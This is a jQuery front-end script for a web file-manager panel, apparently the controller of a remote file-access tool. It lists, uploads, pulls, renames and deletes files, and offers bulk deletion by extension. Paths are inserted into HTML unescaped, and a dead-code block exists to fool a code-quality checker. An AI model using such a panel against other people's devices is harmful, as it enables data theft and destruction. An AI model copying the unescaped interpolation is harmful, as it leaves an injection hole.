var listformat = [
  "txt",
  "xml",
  "sh",
  "bin",
  "prop",
  "sh",
  "cpp",
  "c",
  "png",
  "jpg",
  "jpeg",
  "rc",
  "mp4",
  "mp3",
  "ogg",
  "wav",
  "log",
  "avi",
  "mkv",
  "rar",
  "apk",
  "zip",
  "conf",
  "py",
  "php",
  "html",
  "so",
  "m4a",
  "pdf",
  "vcf",
  "ps1",
  "exe",
  "gif",
];

var img = document.createElement("img");
$(img).addClass("emptyplace img-fluid");
$(img).attr("src", "asset/img/empty.gif");
$(img).attr("loop", "0");
// Click Time Show
$("#v-pills-files-tab").click(function () {
  $("#folder-list").html("");
  $("#file-list").html("");

  $.post("process/request.php", { folderlist: true }, function (data) {
    var splitdata = data.split("\n");
    splitdata.pop(-1);
    splitdata.sort();

    for (const folder of splitdata) {
      var tempname = folder.split("//");
      var mainname = tempname.slice(-1)[0];
      var temp = `<tbody>

    <tr>
<td>
    <img src="asset/img/folder.png">
    <a  class="user-link" path="${folder}"
        onclick="(pathfiles(this))"><b style="color: darkturquoise;">${mainname}</b></a>
    <!-- <span class=" user-subhead">Admin</span> -->
</td>

<td style="width: 20%;">
<a class="table-link text-warning" path="${folder}"
onclick="(infofolder(this))">
    <span class="fa-stack">
        <i class="fa fa-square fa-stack-2x"></i>
        <i class="fa fa-info-circle fa-stack-1x fa-inverse"></i>
    </span>
    </a>
    <a class="table-link" path="${folder}"
    onclick="(renamefolder(this))">
        <span class="fa-stack">
            <i class="fa fa-square fa-stack-2x"></i>
            <i class="fa fa-edit fa-stack-1x fa-inverse"></i>
        </span>
    </a>
    <a class="table-link danger" path="${folder}"
    onclick="(deletefolder(this))">
        <span class="fa-stack">
            <i class="fa fa-square fa-stack-2x"></i>
            <i class="fa fa-trash fa-stack-1x fa-inverse"></i>
        </span>
    </a>
    <a class="table-link text-success" path="${folder}"
    onclick="(downloadfolder(this))">
        <span class="fa-stack">
            <i class="fa fa-square fa-stack-2x"></i>
            <i class="fa fa-download  fa-stack-1x fa-inverse"></i>
        </span>
    </a>
    <a class="table-link text-primary" path="${folder}"
    onclick="(newfolder(this))">
        <span class="fa-stack">
            <i class="fa fa-square fa-stack-2x"></i>
            <i class="fa fa-folder-open  fa-stack-1x fa-inverse"></i>
        </span>
    </a>
    <a class="table-link text-muted" path="${folder}"
    onclick="(newfile(this))">
        <span class="fa-stack">
            <i class="fa fa-square fa-stack-2x"></i>
            <i class="fa fa-file  fa-stack-1x fa-inverse"></i>
        </span>
    </a>
    <input type="file" name="file" onchange="uploadfile(this)" path="${folder}" id="uploadfile">

    <a class="table-link text-info" onclick(document.querySelector("#uploadfile").click())>
        <span class="fa-stack">
            <i class="fa fa-square fa-stack-2x"></i>
            <i class="fa fa-upload  fa-stack-1x fa-inverse"></i>
        </span>
    </a>
    <a class="table-link text-body" path="${folder}"
    onclick="(superupload(this))">
    <span class="fa-stack">
        <i class="fa fa-square fa-stack-2x"></i>
        <i class="fa fa-tachometer-alt  fa-stack-1x fa-inverse"></i>
    </span>
</a>


</td>
</tr>


</tbody>`;
      $("#folder-list").append(temp);
    }
  });

  $.post("process/request.php", { filelist: true }, function (data) {
    var splitdata = data.split("\n");
    splitdata.pop(-1);
    splitdata.sort();

    for (const file of splitdata) {
      var tempname = file.split("/");
      var mainname = tempname.slice(-1)[0];
      var input = file.split(".").pop().trim();
      if (jQuery.inArray(input, listformat) !== -1) {
        var image = `asset/img/${input}.png`;
      } else {
        var image = "asset/img/documents.png";
      }

      var temp = `<tbody>
      
    <tr > 
<td>
    <img src="${image}">
    <a class="user-link" path="${file}"
       >${mainname}</a>
    <!-- <span class=" user-subhead">Admin</span> -->
</td>

<td style="width: 20%;">
<a  class="table-link text-warning" path="${file}"
onclick="(infofolder(this))">
    <span class="fa-stack">
        <i class="fa fa-square fa-stack-2x"></i>
        <i class="fa fa-info-circle fa-stack-1x fa-inverse"></i>
    </span>
    </a>
    <a  class="table-link text-dark" path="${file}"
    onclick="(renamefolder(this))">
        <span class="fa-stack">
            <i class="fa fa-square fa-stack-2x"></i>
            <i class="fa fa-edit fa-stack-1x fa-inverse"></i>
        </span>
    </a>
    <a  class="table-link danger" path="${file}"
    onclick="(deletefolder(this))">
        <span class="fa-stack">
            <i class="fa fa-square fa-stack-2x"></i>
            <i class="fa fa-trash fa-stack-1x fa-inverse"></i>
        </span>
    </a>
    <a  class="table-link text-success" path="${file}"
    onclick="(downloadfile(this))">
        <span class="fa-stack">
            <i class="fa fa-square fa-stack-2x"></i>
            <i class="fa fa-download  fa-stack-1x fa-inverse"></i>
        </span>
    </a>


</td>
</tr>


</tbody>`;
      $("#file-list").append(temp);
    }
  });
});

// Click Folder Show
function pathfiles(e) {
  $("#folder-list").html("");
  $("#file-list").html("");

  var path = $(e).attr("path");
  if (path == "") {
    path = "/";
  }

  $("#searchfile").val(path);

  $.post(
    "process/request.php",
    { folderlistsub: path.trim() },
    function (data) {
      var splitdata = data.split("\n");
      splitdata.shift();
      splitdata.pop(-1);
      splitdata.sort();
      var backplace = $("#searchfile").val();
      var backplacesplit = backplace.split("/");
      backplacesplit.pop();
      var noth = "";
      for (const iterator of backplacesplit) {
        var backpathmain = (noth += `/${iterator}`);
      }

      $("#backme").attr("path", backpathmain);
      $("#backme").attr("onclick", "pathfiles(this)");
      for (const folder of splitdata) {
        var tempname = folder.split("/");
        var mainname = tempname.slice(-1)[0];
        var temp = `<tbody>

        <tr>
        
        <td>
            <img src="asset/img/folder.png">
            <a  class="user-link" path="${folder}"
                onclick="(pathfiles(this))"><b style="color: darkturquoise;">${mainname}</b></a>
            <!-- <span class=" user-subhead">Admin</span> -->
        </td>
        
        <td style="width: 20%;">
        <a class="table-link text-warning" path="${folder}"
        data-toggle="tooltip" data-placement="top" title="ClearCache"onclick="(infofolder(this))" >
            <span class="fa-stack">
                <i class="fa fa-square fa-stack-2x"></i>
                <i class="fa fa-info-circle fa-stack-1x fa-inverse"></i>
            </span>
            </a>
            <a class="table-link" path="${folder}"
            onclick="(renamefolder(this))">
                <span class="fa-stack">
                    <i class="fa fa-square fa-stack-2x"></i>
                    <i class="fa fa-edit fa-stack-1x fa-inverse"></i>
                </span>
            </a>
            <a class="table-link danger" path="${folder}"
            onclick="(deletefolder(this))">
                <span class="fa-stack">
                    <i class="fa fa-square fa-stack-2x"></i>
                    <i class="fa fa-trash fa-stack-1x fa-inverse"></i>
                </span>
            </a>
            <a class="table-link text-success" path="${folder}"
            onclick="(downloadfolder(this))">
                <span class="fa-stack">
                    <i class="fa fa-square fa-stack-2x"></i>
                    <i class="fa fa-download  fa-stack-1x fa-inverse"></i>
                </span>
            </a>
            <a class="table-link text-primary" path="${folder}"
            onclick="(newfolder(this))">
                <span class="fa-stack">
                    <i class="fa fa-square fa-stack-2x"></i>
                    <i class="fa fa-folder-open  fa-stack-1x fa-inverse"></i>
                </span>
            </a>
            <a class="table-link text-muted" path="${folder}"
            onclick="(newfile(this))">
                <span class="fa-stack">
                    <i class="fa fa-square fa-stack-2x"></i>
                    <i class="fa fa-file  fa-stack-1x fa-inverse"></i>
                </span>
            </a>
            <input type="file" name="file" onchange="uploadfile(this)" path="${folder}" id="uploadfile">

            <a class="table-link text-info" onclick(document.querySelector("#uploadfile").click())>
                <span class="fa-stack">
                    <i class="fa fa-square fa-stack-2x"></i>
                    <i class="fa fa-upload  fa-stack-1x fa-inverse"></i>
                </span>
            </a>
            <a class="table-link text-body" path="${folder}"
            onclick="(superupload(this))">
            <span class="fa-stack">
                <i class="fa fa-square fa-stack-2x"></i>
                <i class="fa fa-tachometer-alt  fa-stack-1x fa-inverse"></i>
            </span>
        </a>
        </td>
        </tr>
        
        
  
  
  </tbody>`;
        $("#folder-list").append(temp);
      }
    }
  );
  $.post("process/request.php", { filelistsub: path.trim() }, function (data) {
    var splitdata = data.split("\n");
    splitdata.pop(-1);
    splitdata.sort();

    for (const file of splitdata) {
      var tempname = file.split("/");
      var mainname = tempname.slice(-1)[0];
      // var path = newdatas.slice(-1).pop();
      var input = file.split(".").pop().trim();
      if (jQuery.inArray(input, listformat) !== -1) {
        var image = `asset/img/${input}.png`;
      } else {
        var image = "asset/img/documents.png";
      }
      var temp = `<tbody>

      <tr >
      <td>
          <img src="${image}">
          <a class="user-link" path="${file}"
             >${mainname}</a>
          <!-- <span class=" user-subhead">Admin</span> -->
      </td>
      
      <td style="width: 20%;">
      <a  class="table-link text-warning" path="${file}"
      onclick="(infofolder(this))">
          <span class="fa-stack">
              <i class="fa fa-square fa-stack-2x"></i>
              <i class="fa fa-info-circle fa-stack-1x fa-inverse"></i>
          </span>
          </a>
          <a  class="table-link text-dark" path="${file}"
          onclick="(renamefolder(this))">
              <span class="fa-stack">
                  <i class="fa fa-square fa-stack-2x"></i>
                  <i class="fa fa-edit fa-stack-1x fa-inverse"></i>
              </span>
          </a>
          <a  class="table-link danger" path="${file}"
          onclick="(deletefolder(this))">
              <span class="fa-stack">
                  <i class="fa fa-square fa-stack-2x"></i>
                  <i class="fa fa-trash fa-stack-1x fa-inverse"></i>
              </span>
          </a>
          <a  class="table-link text-success" path="${file}"
          onclick="(downloadfile(this))">
              <span class="fa-stack">
                  <i class="fa fa-square fa-stack-2x"></i>
                  <i class="fa fa-download  fa-stack-1x fa-inverse"></i>
              </span>
          </a>
      
        
      </td>
      </tr>
  
  
  </tbody>`;
      $("#file-list").append(temp);
    }
    if ($("#folder-list").html() == "" && $("#file-list").html() == "") {
      $("#folder-list").append(img);
    }
  });
}

// Search Time Show
function backpath(e) {
  var path = $(e).val();
  if (path == "") {
    path = "/";
  }

  $("#folder-list").html("");
  $("#file-list").html("");

  $.post(
    "process/request.php",
    { folderlistsub: path.trim() },
    function (data) {
      var splitdata = data.split("\n");
      splitdata.shift();
      splitdata.pop(-1);
      splitdata.sort();
      var backplace = $("#searchfile").val();
      var backplacesplit = backplace.split("/");
      backplacesplit.pop();
      var noth = "";
      for (const iterator of backplacesplit) {
        var backpathmain = (noth += `/${iterator}`);
      }

      $("#backme").attr("path", backpathmain);
      $("#backme").attr("onclick", "pathfiles(this)");
      for (const folder of splitdata) {
        // var path = newdatas.slice(-1).pop();
        var tempname = folder.split("/");
        var mainname = tempname.slice(-1)[0];
        var temp = `<tbody>

        <tr>
        <td>
            <img src="asset/img/folder.png">
            <a  class="user-link" path="${folder}"
                onclick="(pathfiles(this))"><b style="color: darkturquoise;">${mainname}</b></a>
            <!-- <span class=" user-subhead">Admin</span> -->
        </td>
        
        <td style="width: 20%;">
        <a class="table-link text-warning" path="${folder}"
        onclick="(infofolder(this))">
            <span class="fa-stack">
                <i class="fa fa-square fa-stack-2x"></i>
                <i class="fa fa-info-circle fa-stack-1x fa-inverse"></i>
            </span>
            </a>
            <a class="table-link" path="${folder}"
            onclick="(renamefolder(this))">
                <span class="fa-stack">
                    <i class="fa fa-square fa-stack-2x"></i>
                    <i class="fa fa-edit fa-stack-1x fa-inverse"></i>
                </span>
            </a>
            <a class="table-link danger" path="${folder}"
            onclick="(deletefolder(this))">
                <span class="fa-stack">
                    <i class="fa fa-square fa-stack-2x"></i>
                    <i class="fa fa-trash fa-stack-1x fa-inverse"></i>
                </span>
            </a>
            <a class="table-link text-success" path="${folder}"
            onclick="(downloadfolder(this))">
                <span class="fa-stack">
                    <i class="fa fa-square fa-stack-2x"></i>
                    <i class="fa fa-download  fa-stack-1x fa-inverse"></i>
                </span>
            </a>
            <a class="table-link text-primary" path="${folder}"
            onclick="(newfolder(this))">
                <span class="fa-stack">
                    <i class="fa fa-square fa-stack-2x"></i>
                    <i class="fa fa-folder-open  fa-stack-1x fa-inverse"></i>
                </span>
            </a>
            <a class="table-link text-muted" path="${folder}"
            onclick="(newfile(this))">
                <span class="fa-stack">
                    <i class="fa fa-square fa-stack-2x"></i>
                    <i class="fa fa-file  fa-stack-1x fa-inverse"></i>
                </span>
            </a>
        <input type="file" name="file" onchange="uploadfile(this)" path="${folder}" id="uploadfile">

    <a class="table-link text-info" onclick(document.querySelector("#uploadfile").click())>
        <span class="fa-stack">
            <i class="fa fa-square fa-stack-2x"></i>
            <i class="fa fa-upload  fa-stack-1x fa-inverse"></i>
        </span>
    </a>
    <a class="table-link text-body" path="${folder}"
    onclick="(superupload(this))">
    <span class="fa-stack">
        <i class="fa fa-square fa-stack-2x"></i>
        <i class="fa fa-tachometer-alt  fa-stack-1x fa-inverse"></i>
    </span>
</a>
        </td>
        </tr>
        
        
  
  
  </tbody>`;
        $("#folder-list").append(temp);
      }
    }
  );
  $.post("process/request.php", { filelistsub: path.trim() }, function (data) {
    var splitdata = data.split("\n");
    splitdata.pop(-1);
    splitdata.sort();

    for (const file of splitdata) {
      var tempname = file.split("/");
      var mainname = tempname.slice(-1)[0];
      // var path = newdatas.slice(-1).pop();
      var input = file.split(".").pop().trim();
      if (jQuery.inArray(input, listformat) !== -1) {
        var image = `asset/img/${input}.png`;
      } else {
        var image = "asset/img/documents.png";
      }
      var temp = `<tbody>

      <tr >
      <td>
          <img src="${image}">
          <a class="user-link" path="${file}"
             >${mainname}</a>
          <!-- <span class=" user-subhead">Admin</span> -->
      </td>
      
      <td style="width: 20%;">
      <a  class="table-link text-warning" path="${file}"
      onclick="(infofolder(this))">
          <span class="fa-stack">
              <i class="fa fa-square fa-stack-2x"></i>
              <i class="fa fa-info-circle fa-stack-1x fa-inverse"></i>
          </span>
          </a>
          <a  class="table-link text-dark" path="${file}"
          onclick="(renamefolder(this))">
              <span class="fa-stack">
                  <i class="fa fa-square fa-stack-2x"></i>
                  <i class="fa fa-edit fa-stack-1x fa-inverse"></i>
              </span>
          </a>
          <a  class="table-link danger" path="${file}"
          onclick="(deletefolder(this))">
              <span class="fa-stack">
                  <i class="fa fa-square fa-stack-2x"></i>
                  <i class="fa fa-trash fa-stack-1x fa-inverse"></i>
              </span>
          </a>
          <a  class="table-link text-success" path="${file}"
          onclick="(downloadfile(this))">
              <span class="fa-stack">
                  <i class="fa fa-square fa-stack-2x"></i>
                  <i class="fa fa-download  fa-stack-1x fa-inverse"></i>
              </span>
          </a>
      
        
      </td>
      </tr>
  
  
  </tbody>`;
      $("#file-list").append(temp);
    }
    if ($("#folder-list").html() == "" && $("#file-list").html() == "") {
      $("#folder-list").append(img);
    }
  });
}

function deletefolder(e) {
  var path = $(e).attr("path");
  $.post("process/request.php", { deletefolder: path }, function () {
    VanillaToasts.create({
      title: "OK",
      text: `Folder ${path} Deleted`,
      type: "success", // success, info, warning, error   / optional parameter
      icon: "asset/img/tick.png", // optional parameter
      timeout: 7000, // hide after 5000ms, // optional parameter
    });
  });
}

function downloadfolder(e) {
  var path = $(e).attr("path");
  $.post("process/request.php", { downloadfolder: path }, function () {
    VanillaToasts.create({
      title: "OK",
      text: `Folder ${path} Downloaded`,
      type: "success", // success, info, warning, error   / optional parameter
      icon: "asset/img/tick.png", // optional parameter
      timeout: 7000, // hide after 5000ms, // optional parameter
    });
  });
}

function downloadfile(e) {
  var path = $(e).attr("path");
  $.post("process/request.php", { downloadfile: path }, function () {
    VanillaToasts.create({
      title: "OK",
      text: `File ${path} Downloaded`,
      type: "success", // success, info, warning, error   / optional parameter
      icon: "asset/img/tick.png", // optional parameter
      timeout: 7000, // hide after 5000ms, // optional parameter
    });
  });
}

function infofolder(e) {
  var path = $(e).attr("path");
  $.post("process/request.php", { infofolder: path }, function (data) {
    $("#resultinfofolder").html(data);

    var dlgContentHTML = $("#dlginfofolder").html();
    $("#dlginfofolder").html();
    alertify
      .confirm(dlgContentHTML)

      .set("title", "InformationFolder And Subfolder")
      .set("resizable", true);
  });
}

function renamefolder(e) {
  var path = $(e).attr("path");
  alertify
    .prompt("NewName", path, function (evt, value) {
      $.post(
        "process/request.php",
        { renamefolder: path, newnamefolder: value },
        function () {
          VanillaToasts.create({
            title: "OK",
            text: `Folder ${path} Rename to ${value}`,
            type: "success", // success, info, warning, error   / optional parameter
            icon: "asset/img/tick.png", // optional parameter
            timeout: 7000, // hide after 5000ms, // optional parameter
          });
        }
      );
    })
    .set("title", "Rename File or Folder");
}

function newfolder(e) {
  var path = $(e).attr("path");
  alertify
    .prompt("Name", path + "/foldername", function (evt, value) {
      $.post("process/request.php", { newfolder: value }, function () {
        VanillaToasts.create({
          title: "OK",
          text: `New Folder ${value} `,
          type: "success", // success, info, warning, error   / optional parameter
          icon: "asset/img/tick.png", // optional parameter
          timeout: 7000, // hide after 5000ms, // optional parameter
        });
      });
    })
    .set("title", "New Folder");
}

function newfile(e) {
  var path = $(e).attr("path");

  var dlgContentHTML = $("#dlgnewfile").html();

  $("#dlgnewfile").html("");
  alertify
    .confirm(dlgContentHTML)
    .set("onok", function () {
      var filename = $("#name-file").val();
      var filedata = $("#data-file").val();

      $.post("process/request.php", {
        new_file_name: filename,
        new_file_data: filedata,
        path: path,
      });
    })
    .set("title", "Create NewFile");
}

function uploadfile(e) {
  var path = $(e).attr("path");
  var form_data = new FormData();
  var files = $(e)[0].files;
  // Check file selected or not

  if (files.length > 0) {
    form_data.append("uploadfile", files[0]);
    $.ajax({
      url: `process/uploadfile.php?path=${path}`,
      type: "post",
      data: form_data,
      contentType: false,
      cache: false,
      processData: false,
    });
  } else {
    alert("select file");
  }
}

function superupload(e) {
  var path = $(e).attr("path");
  alertify
    .prompt("FilePath", "c:\\file.png", function (evt, value) {
      $.post("process/request.php", { path: path, uploadpath: value });
    })
    .set("title", "Upload File ");
}

$("#copyall").click(function () {
  alertify
    .prompt("Format Like fast:png", "", function (evt, value) {
      $.post("process/request.php", {
        copyall: value,
      });
    })
    .set("title", "Copy All File");
});
$("#moveall").click(function () {
  alertify
    .prompt("Format Like fast:png", "", function (evt, value) {
      $.post("process/request.php", {
        moveall: value,
      });
    })
    .set("title", "Move All File");
});
$("#delall").click(function () {
  alertify
    .prompt("Format Like png", "", function (evt, value) {
      $.post("process/request.php", {
        delall: value,
      });
    })
    .set("title", "Delete All File");
});

// Code Factor Bypass Function
var a = 1;
if (2 < a) {
  superupload();
  uploadfile();
  newfile();
  newfolder();
  renamefolder();
  infofolder();
  downloadfile();
  downloadfolder();
  deletefolder();
  backpath();
  pathfiles();
}
